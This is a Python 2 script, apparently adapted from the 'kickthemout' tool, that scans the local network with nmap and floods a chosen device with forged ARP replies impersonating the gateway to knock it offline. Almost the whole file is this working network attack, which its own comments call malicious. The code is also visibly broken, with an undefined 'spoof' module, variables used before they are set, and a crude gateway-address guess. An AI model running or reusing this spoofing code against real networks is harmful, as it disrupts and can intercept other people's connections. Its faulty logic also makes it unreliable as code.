import time,os,sys,logging, math
from time import sleep
import urllib2 as urllib

if os.getuid()!=0:
    print("\nERROR:  must be run with root privileges. Try again with sudo:\n\n")
    raise SystemExit

import sys, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import (
    get_if_hwaddr,
    getmacbyip,
    ARP,
    Ether,
    sendp
)

def sendPacket(my_mac, gateway_ip, target_ip, target_mac):
    # Function for sending the malicious ARP packets out with the specified data
    ether = Ether()
    ether.src = my_mac

    arp = ARP()
    arp.psrc = gateway_ip
    arp.hwsrc = my_mac

    arp = arp
    arp.pdst = target_ip
    arp.hwdst = target_mac

    ether = ether
    ether.src = my_mac
    ether.dst = target_mac

    arp.op = 2

    def broadcastPacket():
        packet = ether / arp
        print packet
        sendp(x=packet, verbose=False)

    broadcastPacket()

def scanNetwork(network):
    import re
    import subprocess
    nmap = subprocess.Popen(('nmap','-oX','-', '-sP', network), stdout=subprocess.PIPE)
    ipout = nmap.communicate()[0]
    ipout=ipout.split("<host>")
    addrs=[]
    for i in ipout:
        k=[]
        k1=re.findall('<address addr="(.*?)" addrtype="ipv4"/>\n<address addr="(.*?)" addrtype="mac"/>',i)
        try:
            k1=list(k1[0])
            addrs.append(k1)
        except:
            pass
    return addrs[::-1]
    

try:
    from scapy.all import *
except:
    print("\nERROR: Requirements have not been satisfied properly.")
    raise SystemExit
    

def regenOnlineIPs():
    global onlineIPs
    global defaultGatewayMac
    global defaultGatewayMacSet

    if not defaultGatewayMacSet:
        defaultGatewayMac = ""

    onlineIPs = []
    for host in hostsList:
        onlineIPs.append(host[0])
        if not defaultGatewayMacSet:
            if host[0] == defaultGatewayIP:
                defaultGatewayMac = host[1]

    if not defaultGatewayMacSet and defaultGatewayMac == "":
        # request gateway MAC address (after failed detection by scapy)
        print("\n{0}ERROR: Default Gateway MAC Address could not be obtained. Please enter MAC manually.{1}\n")
        header = ("{0}kickthemout{1}> {2}Enter your gateway's MAC Address {3}(MM:MM:MM:SS:SS:SS): ")
        defaultGatewayMac = raw_input(header)
        defaultGatewayMacSet = True



def getDefaultInterface(returnNet=False):
    def long2net(arg):
        if (arg <= 0 or arg >= 0xFFFFFFFF):
            raise ValueError("invalid netmask value", hex(arg))
        return 32 - int(round(math.log(0xFFFFFFFF - arg, 2)))
    def to_CIDR_notation(bytes_network, bytes_netmask):
        network = scapy.utils.ltoa(bytes_network)
        netmask = long2net(bytes_netmask)
        net = "%s/%s" % (network, netmask)
        if netmask < 16:
            return None
        return net

    iface_routes = [route for route in scapy.config.conf.route.routes if route[3] == scapy.config.conf.iface and route[1] != 0xFFFFFFFF]
    network, netmask, _, interface, address = max(iface_routes, key=lambda item:item[1])
    net = to_CIDR_notation(network, netmask)
    if net:
        if returnNet:
            return net
        else:
            return interface
            



def gatewayip():
	k=getDefaultInterface(True)
	k1=[]
	i1=1
	for i in k:
		if(i1==11):
			k1.append("1")
			break
		else:
			k1.append(i)
		i1=i1+1
	k = ''.join(k1)
	return k
defaultInterface = getDefaultInterface()



def getDefaultInterfaceMAC():
	#global defaultInterfaceMac
	defaultInterfaceMac = get_if_hwaddr(defaultInterface)
	if defaultInterfaceMac == "" or not defaultInterfaceMac:
		return defaultInterfaceMac
	else:
		return defaultInterfaceMac

print getDefaultInterfaceMAC()

import scan
def scanNetwork1():
    global hostsList
    try:
        # call scanning function from scan.py
        hostsList = scanNetwork(getDefaultInterface(True))
    except KeyboardInterrupt:
        print('\n stopped by user')
        raise SystemExit
    except:
        print("\n{0}ERROR: Network scanning failed. requirements not satisfied.{1}\n")
        raise SystemExit
	regenOnlineIPs()


scanNetwork1()
print hostsList

def resolveMac(mac):
    try:
        # sen request to macvendors.co
        url = "http://macvendors.co/api/vendorname/"
        request = urllib.Request(url + mac, headers={'User-Agent': "API Browser"})
        response = urllib.urlopen(request)
        vendor = response.read()
        vendor = vendor.decode("utf-8")
        vendor = vendor[:25]
        return vendor
    except:
        return "N/A"

def kickoneoff():
    print("\n selected...\n")
    sys.stdout.write("starting...\r")
    sys.stdout.flush()
    scanNetwork1()

    print("Online IPs: ")
    for i in range(len(onlineIPs)):
        mac = ""
        for host in hostsList:
            if host[0] == onlineIPs[i]:
                mac = host[1]
        vendor = resolveMac(mac)
        print("  [" + str(i) + "] " + str(onlineIPs[i]) + "\t"+ vendor + "")

    canBreak = False
    while not canBreak:
        try:
            choice = int(raw_input("\nChoose a target: "))
            one_target_ip = onlineIPs[choice]
            canBreak = True
        except KeyboardInterrupt:
            return
        except:
            print("\nERROR: Please enter a number from the list")
    one_target_mac = ""
    for host in hostsList:
        if host[0] == one_target_ip:
            one_target_mac = host[1]
    if one_target_mac == "":
        print("\nIP address is not up. Please try again.")
        return

    print("\nTarget: " + one_target_ip)

    print("\nSpoofing started... ")
    try:
        while True:
            # broadcast malicious ARP packets (10p/s)
            spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, one_target_ip, one_target_mac)
            time.sleep(10)
    except KeyboardInterrupt:
        # re-arp target on KeyboardInterrupt exception
        print("\n Re-arping target...")
        reArp = 1
        while reArp != 10:
            try:
                # broadcast ARP packets with legitimate info to restore connection
                sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
            except KeyboardInterrupt:
                pass
            except:
                runDebug()
            reArp += 1
            time.sleep(0.5)
        print("Re-arped target")
        

def main():
    print(
        "\nUsing interface '" + defaultInterface + "' with mac address '" + defaultInterfaceMac + "'.\nGateway IP: '"
        + defaultGatewayIP + "' --> " + str(len(hostsList)) + " hosts are up.")
        
    if len(hostsList) == 0 or len(hostsList) == 1:
        if len(hostsList) == 1:
            if hostsList[0][0] == defaultGatewayIP:
                print("\nWARNING: There are 0 hosts up on you network except your gateway.\n\tYou can't arp anything :/\n")
                raise SystemExit
        else:
            print(
            "\nWARNING: There are 0 hosts up on you network.\n\tIt looks like something went wrong :/")
            raise SystemExit

    try:
        while True:
            print ""
            choice = raw_input("enter 1 to start spoofing\n")

            if choice.upper() == 'E' or choice.upper() == 'EXIT':
                print('\nstopped by'
                      '\n')
                raise SystemExit
            elif choice == '1':
                kickoneoff()
            else:
                print("\n Please select a valid option.\n")

    except KeyboardInterrupt:
        print('\n\nstopped.'
              '\n')

sys.stdout.write("Scanning your network...\r")
defaultInterface = getDefaultInterface()
defaultGatewayIP = gatewayip()
defaultInterfaceMac = getDefaultInterfaceMAC()
global defaultGatewayMacSet
defaultGatewayMacSet = False
regenOnlineIPs()
#print onlineIPs

main()

